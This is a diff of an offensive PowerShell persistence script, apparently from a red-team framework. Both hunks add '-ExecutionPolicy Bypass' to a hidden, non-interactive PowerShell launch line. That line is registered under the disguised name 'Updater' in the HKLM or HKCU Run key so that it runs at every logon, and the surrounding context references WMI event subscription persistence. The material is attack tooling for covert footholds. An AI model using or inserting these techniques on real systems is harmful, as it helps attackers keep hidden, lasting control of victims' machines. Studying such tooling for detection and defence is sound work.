@@ -592,7 +592,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
         {
             $ElevatedTrigger = "New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "
             $ElevatedTriggerRemoval = "Remove-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater"
-            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden`""
+            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass`""
             $ElevatedTrigger = "'" + $ElevatedTrigger + $CommandLine + "'"
         }
 
@@ -635,7 +635,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
         {
             $UserTrigger = "New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "
             $UserTriggerRemoval = "Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater"
-            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden`""
+            $CommandLine = "`"```"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe```" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass`""
             $UserTrigger = "'" + $UserTrigger + $CommandLine + "'"
         }
 
